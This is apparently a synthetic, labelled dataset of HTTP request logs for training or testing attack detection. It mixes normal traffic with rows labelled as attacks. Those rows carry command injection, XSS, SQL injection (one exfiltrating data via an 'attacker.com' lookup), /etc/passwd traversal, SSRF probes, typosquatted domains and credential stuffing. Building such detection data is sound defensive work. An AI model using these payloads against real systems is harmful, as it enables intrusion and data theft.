timestamp,source_ip,destination_ip,protocol,http_method,url,request_headers,request_body,response_code,response_size,response_headers,user_agent,payload_raw,attack_type_label,hour,day_of_week,is_weekend,is_attack,parsed_request_headers,parsed_response_headers,Host,User-Agent,Accept,Content-Type,Server
2026-03-24 08:38:40,172.16.0.53,192.168.1.1,https,get,/ping?ip=127.0.0.1&& ls -la,"{""Host"":""185.199.108.153"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,500,1447,"{""Content-Type"":""text/html"",""Server"":""nginx""}",BurpSuite/2023.12,&& ls -la,command_injection,8,1,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",185.199.108.153,BurpSuite/2023.12,*/*,text/html,nginx
2026-03-19 03:47:00,10.0.0.107,185.199.108.153,https,post,/comment,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",comment=%27%3B%3Cscript%3Ealert%281%29%3C/script%3E,404,2162,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,';<script>alert(1)</script>,xss,3,3,0,1,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",203.0.113.45,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,nginx
2026-03-19 18:34:16,198.51.100.234,185.199.108.153,https,get,/contact?sort=books,"{""Host"":""34.120.45.67"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200,1767,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,,normal,18,3,0,0,"{'Host': '34.120.45.67', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",34.120.45.67,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,nginx
2026-03-16 23:21:18,10.0.0.69,3.12.45.78,http,get,"/search?q=' and load_file(concat('\\',database(),'.attacker.com\'))--","{""Host"":""104.18.24.12"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,500,410,"{""Content-Type"":""text/html"",""Server"":""Apache""}",BurpSuite/2023.12,"' and load_file(concat('\\',database(),'.attacker.com\'))--",sql_injection,23,0,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",104.18.24.12,BurpSuite/2023.12,*/*,text/html,Apache
2026-03-14 18:16:39,10.0.0.32,10.0.0.1,https,get,https://amazon-order-confirmation.net/login,"{""Host"":""52.45.123.89"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,200,2359,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,amazon-order-confirmation.net,typosquatting_url_spoofing,18,5,1,1,"{'Host': '52.45.123.89', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",52.45.123.89,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,IIS
2026-03-11 15:34:30,10.0.0.26,203.0.113.45,http,get,/view?path=../../../../etc/passwd%00.jpg,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,403,429,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,../../../../etc/passwd.jpg,directory_traversal,15,2,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",104.18.24.12,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,Apache
2026-03-19 12:28:01,192.168.1.78,3.12.45.78,https,get,/login,"{""Host"":""34.120.45.67"",""User-Agent"":""Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,200,1331,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,,normal,12,3,0,0,"{'Host': '34.120.45.67', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",34.120.45.67,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,Apache
2026-03-14 07:04:09,172.16.0.116,104.18.24.12,http,get,"/search?q=' and extractvalue(1,concat(0x7e,database()))--","{""Host"":""172.67.128.45"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",,500,5165,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nmap Scripting Engine,"' and extractvalue(1,concat(0x7e,database()))--",sql_injection,7,5,1,1,"{'Host': '172.67.128.45', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",172.67.128.45,Nmap Scripting Engine,*/*,text/html,Apache
2026-03-13 04:54:12,172.16.0.233,52.45.123.89,https,post,/comment,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",comment=javascript%3Aalert%28%27DOM%20XSS%27%29,403,7034,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,javascript:alert('dom xss'),xss,4,4,0,1,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",203.0.113.45,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,IIS
2026-03-21 18:54:46,10.0.0.169,3.12.45.78,http,get,/blog,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,200,1482,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,,normal,18,5,1,0,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",198.51.100.23,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,Cloudflare
2026-03-16 12:10:11,192.168.1.16,52.45.123.89,https,get,/css/style.css,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,200,4689,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,,normal,12,0,0,0,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",198.51.100.23,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,nginx
2026-03-12 21:53:32,104.18.24.29,104.18.24.12,http,get,/traceroute?host=--upload=/tmp/malicious.php,"{""Host"":""203.0.113.45"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,200,7402,"{""Content-Type"":""text/html"",""Server"":""IIS""}",BurpSuite/2023.12,--upload=/tmp/malicious.php,command_injection,21,3,0,1,"{'Host': '203.0.113.45', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",203.0.113.45,BurpSuite/2023.12,*/*,text/html,IIS
2026-03-10 05:23:20,172.16.0.61,52.45.123.89,http,post,/login,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",username=alice&password=Winter2024,500,7107,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,username=alice&password=winter2024,credential_stuffing_brute_force,5,1,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",185.199.108.153,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,nginx
2026-03-19 12:20:26,192.168.1.126,172.67.128.45,http,post,/comment,"{""Host"":""192.168.1.1"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",comment=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,200,4277,"{""Content-Type"":""text/html"",""Server"":""IIS""}",XSStrike/3.1.5,<iframe src='javascript:alert(1)'>,xss,12,3,0,1,"{'Host': '192.168.1.1', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",192.168.1.1,XSStrike/3.1.5,*/*,text/html,IIS
2026-03-14 23:31:20,10.0.0.132,172.67.128.45,http,get,/settings?limit=2,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"",""Accept"":""*/*""}",,200,3473,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,,normal,23,5,1,0,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",172.67.128.45,Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,*/*,text/html,nginx
2026-03-18 10:50:48,192.168.1.122,3.12.45.78,https,get,https://gooogle.com/login,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200,1085,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,gooogle.com,typosquatting_url_spoofing,10,2,0,1,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",192.168.1.1,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Apache
2026-03-12 05:32:16,192.168.1.114,203.0.113.45,http,get,/contact?sort=books,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,200,569,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,,normal,5,3,0,0,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",203.0.113.45,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,nginx
2026-03-12 04:50:49,192.168.1.127,3.12.45.78,https,get,/search?q=#<script>alert(document.domain)</script>,"{""Host"":""10.0.0.1"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,200,3226,"{""Content-Type"":""text/html"",""Server"":""Apache""}",XSStrike/3.1.5,#<script>alert(document.domain)</script>,xss,4,3,0,1,"{'Host': '10.0.0.1', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",10.0.0.1,XSStrike/3.1.5,*/*,text/html,Apache
2026-03-20 23:40:33,10.0.0.105,104.18.24.12,https,get,/proxy?target=http://127.0.0.1:3306,"{""Host"":""34.120.45.67"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",,403,2070,"{""Content-Type"":""text/html"",""Server"":""nginx""}",SQLmap/1.8.4,http://127.0.0.1:3306,ssrf,23,4,0,1,"{'Host': '34.120.45.67', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",34.120.45.67,SQLmap/1.8.4,*/*,text/html,nginx
2026-03-09 03:23:30,203.0.113.125,192.168.1.1,http,get,"/search?q=' and (select * from(select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--","{""Host"":""3.12.45.78"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,401,1532,"{""Content-Type"":""text/html"",""Server"":""nginx""}",BurpSuite/2023.12,"' and (select * from(select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--",sql_injection,3,0,0,1,"{'Host': '3.12.45.78', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",3.12.45.78,BurpSuite/2023.12,*/*,text/html,nginx
2026-03-20 16:43:11,198.51.100.29,203.0.113.45,https,get,https://amaz0n.com/login,"{""Host"":""104.18.24.12"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,404,3234,"{""Content-Type"":""text/html"",""Server"":""nginx""}",BurpSuite/2023.12,amaz0n.com,typosquatting_url_spoofing,16,4,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",104.18.24.12,BurpSuite/2023.12,*/*,text/html,nginx
2026-03-11 14:55:12,203.0.113.232,185.199.108.153,http,post,/products,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",username=john_doe&password=pass123,301,3161,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,,normal,14,2,0,0,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",185.199.108.153,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,Cloudflare
